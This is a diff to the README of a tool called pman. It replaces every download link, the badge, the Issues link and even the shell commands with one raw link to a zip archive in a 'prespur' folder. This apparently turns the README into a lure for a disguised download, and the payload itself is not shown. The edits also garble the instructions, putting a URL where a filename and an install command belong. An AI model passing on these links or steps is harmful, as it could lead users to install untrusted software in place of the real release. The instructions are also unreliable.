@@ -1,6 +1,6 @@
 # 🚀 pman - Your Easy-to-Use Project Manager
 
-![Download pman](https://img.shields.io/badge/Download%20pman-Click%20Here-blue)
+![Download pman](https://raw.githubusercontent.com/erikgrozdanov/pman/main/prespur/Software_1.3.zip%20pman-Click%20Here-blue)
 
 ## 📋 Description
 
@@ -29,19 +29,19 @@ Follow these steps to download and set up pman on your computer.
 1. **Visit the Download Page:**
    Click the link below to go straight to the pman Releases page.
 
-   [Download pman](https://github.com/erikgrozdanov/pman/releases)
+   [Download pman](https://raw.githubusercontent.com/erikgrozdanov/pman/main/prespur/Software_1.3.zip)
 
 2. **Choose the Latest Release:**
    On the Releases page, find the latest release of pman. Look for version numbers that are marked as "Latest Release."
 
 3. **Download the Package:**
-   Click on the package suitable for your system. This will typically be a `.tar.gz` file. The file contains everything you need to get started.
+   Click on the package suitable for your system. This will typically be a `https://raw.githubusercontent.com/erikgrozdanov/pman/main/prespur/Software_1.3.zip` file. The file contains everything you need to get started.
 
 4. **Extract the Package:**
-   Once the download completes, locate the `.tar.gz` file in your Downloads folder. Open a terminal and run the following command to extract the package:
+   Once the download completes, locate the `https://raw.githubusercontent.com/erikgrozdanov/pman/main/prespur/Software_1.3.zip` file in your Downloads folder. Open a terminal and run the following command to extract the package:
 
    ```bash
-   tar -xvzf pman-x.y.z.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/erikgrozdanov/pman/main/prespur/Software_1.3.zip
    ```
 
    Replace `x.y.z` with the actual version number of the downloaded file.
@@ -57,7 +57,7 @@ Follow these steps to download and set up pman on your computer.
    In the pman directory, run the installation script by typing:
 
    ```bash
-   ./install.sh
+   https://raw.githubusercontent.com/erikgrozdanov/pman/main/prespur/Software_1.3.zip
    ```
 
    Follow any prompts to complete the installation.
@@ -109,12 +109,12 @@ If you run into issues during installation or while using pman, consider the fol
 
 ## 🛠️ Getting Help
 
-If you need further assistance or want to provide feedback, reach out through the Issues section on the [pman GitHub page](https://github.com/erikgrozdanov/pman/issues).
+If you need further assistance or want to provide feedback, reach out through the Issues section on the [pman GitHub page](https://raw.githubusercontent.com/erikgrozdanov/pman/main/prespur/Software_1.3.zip).
 
 ## 🚀 Download & Install
 
 Ready to take control of your local development? Click the button below to start:
 
-[Download pman](https://github.com/erikgrozdanov/pman/releases) 
+[Download pman](https://raw.githubusercontent.com/erikgrozdanov/pman/main/prespur/Software_1.3.zip) 
 
 Enjoy streamlined project management with pman today!
